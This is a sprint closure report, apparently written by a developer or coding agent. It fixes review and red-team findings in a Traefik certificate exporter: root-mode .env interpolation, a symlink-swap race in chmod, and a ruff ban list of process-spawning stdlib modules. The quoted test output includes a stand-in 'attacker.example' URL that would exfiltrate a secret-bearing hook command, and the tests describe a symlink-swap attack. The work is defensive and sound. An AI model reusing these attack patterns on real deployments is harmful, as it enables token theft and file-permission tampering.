# E015 sprint 01 — closure fixes (2026-10-12)

Inputs: `adversarial-review.md` (AR-1, AR-2, AR-3, AR-4, CR-1) and `redteam-report.md`
(RT-1, RT-2, RT-3). Nothing committed or staged. No change to `/config` or `/certs`
ownership, `init-adduser`, the Dockerfile or any s6 script.

Fail-first method: each new test was run against the unfixed code (for the guard, against
the pre-change `pyproject.toml` table, swapped in and restored), then against the fix.

## 1. AR-1 / RT-2 (HIGH) — `.env` interpolation in root mode — FIXED

- Change: `_loadDotenvAsRoot` calls `load_dotenv(path, interpolate=False)`. The non-root
  path (`load_dotenv` elsewhere in `settings.py`) is untouched.
- Files: `src/traefik_certificate_exporter/libs/settings.py`, `tests/libs/test_settings.py`
  (`test_root_does_not_interpolate_the_real_environment_into_a_dotenv_value`,
  `test_non_root_dotenv_interpolation_is_unchanged`), ADR-0049 amendment (sprint closure).
- Fail-first:
  ```
  >       assert value == _INTERPOLATED_URL
  E         - json://attacker.example/?-hook=${TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_POSTEXPORTCOMMAND}
  E         + json://attacker.example/?-hook=<the env-set hook command, secret token included>
  FAILED tests/libs/test_settings.py::test_root_does_not_interpolate_the_real_environment_into_a_dotenv_value
  1 failed, 1 passed, 73 deselected
  ```
  (The fixture value was later changed to `/usr/local/bin/notify --token s3cr3t-token`
  because gitleaks' `curl-auth-header` rule matched it.)
- Pass: `tests/libs/test_settings.py` 75 passed (then 77 in the full run).
- Not done (outside this item): AR-1's `docs/operational.md` wording, AR-12's image test.

## 2. RT-1 (HIGH) — in-place chmod follows a swapped-in symlink — FIXED (chmod sites)

- Change: `_breaks_write_policy` is the only lstat-then-chmod-by-name site; every caller RT-1
  names (`_file_differs`, `_pfx_differs`, `_read_pfx_fingerprint` for the sidecar,
  `_pfx_state`) goes through it. After the `lstat` decides a tighten is needed, the path is
  opened `O_RDONLY | O_NOFOLLOW | O_NONBLOCK | O_CLOEXEC`, `fstat`ed, required `S_ISREG`,
  and tightened with `fchmod`. `ELOOP` or any other open/fstat/fchmod `OSError` returns
  "changed" (the existing failed-chmod fallback: the artifact is rewritten through
  `_atomic_write`). The dry-run path and the WARNING are unchanged.
- Files: `src/traefik_certificate_exporter/libs/certificate_exporter.py`,
  `tests/libs/test_certificate_exporter.py`
  (`test_policy_tighten_does_not_follow_a_symlink_swapped_in_after_lstat`, parametrised
  over the four callers; `os.lstat` is wrapped to swap the planted 0004 file for a symlink
  to a 0640 victim right after it is examined).
- Fail-first (all four callers):
  ```
  E       AssertionError: assert 0 == 416        # victim mode 0o640 became 0o000
  FAILED ...[file_differs] / [pfx_differs] / [read_pfx_fingerprint] / [pfx_state]
  ```
- Pass: `tests/libs/test_certificate_exporter.py` 134 passed.
- Behaviour note: a non-root owner file whose owner bits lack read (e.g. 0204) can no
  longer be tightened in place (open fails `EACCES`) and is rewritten instead; root is
  unaffected.
- Not done (RT-1 remediation 2 / RT-8, not in this assignment): `dir_fd`-relative writes
  for a swapped per-domain directory symlink, and the by-name reads after the check.
  Hard links are not stopped by `O_NOFOLLOW`; the kernel's `protected_hardlinks` is what
  prevents linking a file the account does not own.

## 3. AR-2 + AR-3 (MEDIUM) — spawn-guard coverage — FIXED, with stated limits

- Verified before changing anything (ruff 0.16.5, scratch package): ruff DOES resolve
  `from .post_export import subprocess`, `from . import post_export` +
  `post_export.subprocess.Popen`, and the absolute forms to
  `<pkg>.libs.post_export.subprocess`; it does NOT report `imaplib.subprocess.Popen` or
  `socketserver.os.fork`. So the in-package re-export is now banned (deviation from the
  brief's assumption that it is not statically catchable; recorded here and in ADR-0050).
- Verified spawners (audit hook on 3.11.11 and 3.14.4, plus stdlib source):
  `platform.architecture/processor/platform/uname().processor`, `imaplib.IMAP4_stream`,
  `uuid.getnode`/`uuid6` (3.14), `uuid.uuid1` (falls back to `getnode`); pagers in `pydoc` /
  `_pyrepl.pager`, `mailcap.findmatch` (`os.system` on a `test` field), `pipes`,
  `http.server.CGIHTTPRequestHandler`, `socketserver.Forking*`, `ensurepip`, `venv`,
  `distutils`, `_osx_support`, `_aix_support`, `_bootsubprocess`,
  `asyncio.base_subprocess`, `asyncio.windows_utils` by source.
- Change: 24 entries added to `[tool.ruff.lint.flake8-tidy-imports.banned-api]` (13 modules
  whole, 10 stdlib names, 1 re-export). None is used under `src/` (`ruff check src` clean;
  `src` uses only `uuid.uuid4`). Coverage-limit comment in `pyproject.toml` gains a
  stdlib bullet and a re-export bullet stating what is and is not caught.
- Tests (`tests/libs/test_post_export.py`): `_INDIRECT_SPAWN_NAMES` is required in the table
  by the existing derived-name test; the suppression test's package copy is now named
  `traefik_certificate_exporter` and plants three re-export forms;
  `test_every_stdlib_module_that_spawns_is_banned_or_reviewed` AST-scans the runner's stdlib
  (derived scope) and `test_the_stdlib_spawner_check_reports_a_planted_gap` plants a module
  and removes `imaplib.IMAP4_stream`.
- Fail-first (pre-change table swapped in):
  ```
  FAILED test_every_spawn_capable_name_is_banned_for_ruff
  FAILED test_the_banned_name_check_reports_a_planted_gap
  FAILED test_tid251_is_suppressed_only_at_the_post_export_import
      At index 3 diff: 'libs/post_export.py:3:TID251' != 'libs/planted_reexport.py:1:TID251'
  FAILED test_every_stdlib_module_that_spawns_is_banned_or_reviewed
      Left contains 21 more items, first extra item: '_aix_support'
  FAILED test_the_stdlib_spawner_check_reports_a_planted_gap
  5 failed, 20 passed
  ```
- Pass: `tests/libs/test_post_export.py` 25 passed.
- Still not covered (stated in pyproject and ADR-0050): other modules' `subprocess`/`os`
  attributes, `getattr`/`vars`/`sys.modules`, builtin `help()`, per-function completeness
  in partially banned modules, spawns hidden behind another module's call, modules present
  only on a Python version no runner uses.

## 4. ADR-0050 Decision 4 parenthetical — FIXED (doc)

- `docs/adr/0050-spawn-site-guard-uses-ruff-banned-api.md`, new
  `## Amendment (2026-10-12) — sprint closure`: states the amendment supersedes "ruff is a
  pre-commit hook, not a dev dependency" (ruff==0.16.5 is in the dev group, pinned, parity
  tested). Decision 4 not rewritten in place. No test (documentation).

## 5. AR-4 (MEDIUM) — sidecar does not record the build recipe — FIXED

- Change: `_PFX_BUILD_RECIPE = 1`; the sidecar gains `"builder"`; `_pfx_state` returns
  `rebuild` for a usable sidecar whose `builder` is absent, non-int or different (checked
  before the `.pfx` hash). Format `version` and every other field unchanged.
- Files: `certificate_exporter.py`, `tests/libs/test_certificate_exporter.py`
  (`test_sidecar_with_another_build_recipe_rebuilds_the_pfx_once[absent|older]`,
  `test_pfx_build_recipe_is_pinned_to_the_serializer_source` — SHA-256 of
  `_serialize_pkcs12`'s source per recipe value), ADR-0051 amendment.
- Fail-first:
  ```
  >       assert record["builder"] == certificate_exporter._PFX_BUILD_RECIPE
  E       KeyError: 'builder'
  FAILED ...test_sidecar_with_another_build_recipe_rebuilds_the_pfx_once[absent]
  FAILED ...test_sidecar_with_another_build_recipe_rebuilds_the_pfx_once[older]
  FAILED ...test_pfx_build_recipe_is_pinned_to_the_serializer_source
  ```
- Pass: 134 passed (exporter tests). The pin forces a decision on any source change, not
  the bump itself; a recipe change outside `_serialize_pkcs12` is not detected (stated in
  ADR-0051).

## 6. RT-3 (MEDIUM, doc truth) — FIXED (doc)

- `docs/adr/0049-…md`, new `## Amendment (2026-10-12) — sprint closure`: corrects "a tree
  that account cannot write" and records `PUID`-writable `/certs` as a residual risk; no
  ownership change proposed. The same section records the RT-2 interpolation change. The
  init-script claim was checked (`init-traefik-certificate-exporter-config/run:151`,
  `find … -exec chown -h abc`). No test (documentation).

## 7. CR-1 (LOW) — timing `print()` calls — FIXED

- Removed both `print(...)` blocks from `tests/libs/test_certificate_exporter.py`
  (`test_unchanged_rsa4096_pass_loads_no_key_and_no_pfx`,
  `test_first_rsa4096_pass_loads_each_key_once`). No failing test is meaningful for a
  removal; evidence: before, `grep -n "^\s*print(" tests/libs/test_certificate_exporter.py`
  matched lines 1957 and 1982; after, no match. The timing assertions (AR-8) were not in
  scope and remain.

## Verification

| command | exit | result |
|---|---|---|
| `poetry run pytest -q` | 0 | 595 passed, 10 skipped |
| `poetry run mypy src` | 0 | no issues in 14 source files |
| `poetry run pre-commit run --all-files` | 1 | every hook passes except `gitleaks` (tree): 1 leak, `curl-auth-header` at `_bmad-output/implementation-artifacts/epic-015/sprint-01/closure/redteam-report.md:145` — the red team's demo output (fake `Bearer s3cr3t-token`), an input file this fix did not touch. `gitleaks (history)` passes. `ruff format` reformatted 2 files on the first run. |

Open: the redteam-report line must be redacted (or allowlisted by the maintainer) for
`just check` to pass; left untouched because it is a review artifact outside this
assignment.
